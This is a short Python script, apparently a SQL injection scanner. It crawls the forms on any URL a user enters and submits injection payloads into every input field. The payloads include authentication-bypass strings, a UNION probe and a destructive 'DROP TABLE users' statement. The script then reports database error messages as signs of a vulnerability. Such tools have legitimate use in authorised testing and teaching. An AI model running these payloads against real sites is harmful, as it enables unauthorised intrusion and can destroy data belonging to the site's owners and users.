import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# List of SQL injection payloads
payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' UNION SELECT NULL--", "'; DROP TABLE users; --"]

def scan_sql_injection(url):
    # Send a GET request to the URL
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all forms on the page
    forms = soup.find_all('form')

    # Iterate through each form
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()

        # If the action is a relative URL, combine it with the base URL
        action_url = urljoin(url, action)

        inputs = form.find_all('input')

        # For each input field, try SQL payloads
        for input_field in inputs:
            input_name = input_field.get('name')
            for payload in payloads:
                # Prepare the form data
                data = {input_name: payload}
                if method == 'post':
                    result = requests.post(action_url, data=data)
                else:
                    result = requests.get(action_url, params=data)

                # Check for SQL errors in the response
                if "SQL syntax" in result.text or "mysql" in result.text or "unclosed quotation" in result.text:
                    print(f"[!] Potential SQL Injection vulnerability detected in {input_name}")
                    print(f"Payload: {payload}")
                    print(f"Response: {result.text[:200]}")
                else:
                    print(f"No SQL Injection detected for {input_name} with payload: {payload}")

# Example usage
if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    scan_sql_injection(target_url)
